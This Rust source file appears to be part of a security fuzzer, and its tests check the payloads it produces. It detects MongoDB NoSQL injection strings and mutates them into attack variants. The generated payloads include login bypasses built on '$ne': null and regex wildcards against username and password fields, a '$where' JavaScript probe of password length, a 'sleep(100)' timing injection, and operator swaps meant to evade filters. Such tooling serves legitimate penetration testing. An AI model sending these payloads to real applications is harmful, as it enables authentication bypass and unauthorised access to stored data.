//! `MongoDB` `NoSQL` injection grammar-aware mutation.

/// Detect `MongoDB` `NoSQL` injection signals.
#[must_use]
pub fn detect_type(payload: &str) -> bool {
    let p = payload.trim();
    p.starts_with('{')
        || p.contains("$ne")
        || p.contains("$eq")
        || p.contains("$gt")
        || p.contains("$where")
        || p.contains("$regex")
        || p.contains("$nin")
        || p.contains("$in")
        || p.contains("$exists")
        || p.contains("$expr")
}

/// Generate `MongoDB` `NoSQL` mutation variants.
#[must_use]
pub fn mutate(payload: &str) -> Vec<String> {
    if !detect_type(payload) {
        return Vec::new();
    }
    let mut results = Vec::new();

    // Operator mutations
    let replacements = [
        ("$ne", vec!["$nin", "$not", "$ne"]),
        ("$eq", vec!["$in", "$eq"]),
        ("$gt", vec!["$gte", "$gt"]),
        ("$where", vec!["$expr", "$where"]),
        ("$regex", vec!["$options", "$regex"]),
    ];
    for (orig, alts) in &replacements {
        if payload.contains(orig) {
            for alt in alts {
                if *alt != *orig {
                    results.push(payload.replace(orig, alt));
                }
            }
        }
    }

    // JSON injection variants
    if payload.contains("username") || payload.contains("password") || payload.contains("user") {
        results.push(r#"{"username": {"$ne": null}, "password": {"$ne": null}}"#.into());
        results.push(r#"{"$where": "this.password.length > 0"}"#.into());
        results.push(r#"{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}"#.into());
    }

    // Array-based bypasses
    results.push(payload.replace("$ne", "$in").replace("null", "[null]"));
    results.push(payload.replace("$eq", "$nin"));

    // JavaScript injection
    if payload.contains("$where") {
        results.push(r#"{"$where": "sleep(100) || true"}"#.into());
    }

    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_mongo_signals() {
        assert!(detect_type(r#"{"username": "admin"}"#));
        assert!(detect_type(r#"{"$ne": null}"#));
        assert!(detect_type(r#"{"$where": "1==1"}"#));
    }

    #[test]
    fn generates_operator_variants() {
        let mutations = mutate(r#"{"username": {"$ne": null}}"#);
        assert!(mutations.iter().any(|m| m.contains("$nin")));
    }

    #[test]
    fn rejects_non_mongo() {
        assert!(!detect_type("' OR 1=1--"));
        assert!(mutate("hello world").is_empty());
    }

    #[test]
    fn generates_regex_bypass() {
        let mutations = mutate(r#"{"username": {"$ne": null}}"#);
        assert!(mutations.iter().any(|m| m.contains("$regex")));
    }

    #[test]
    fn generates_where_injection() {
        let mutations = mutate(r#"{"$where": "1==1"}"#);
        assert!(mutations.iter().any(|m| m.contains("sleep")));
    }

    #[test]
    fn array_bypass_replaces_ne() {
        let mutations = mutate(r#"{"field": {"$ne": null}}"#);
        assert!(
            mutations
                .iter()
                .any(|m| m.contains("$in") && m.contains("[null]"))
        );
    }

    #[test]
    fn empty_payload_returns_empty() {
        assert!(mutate("").is_empty());
    }
}
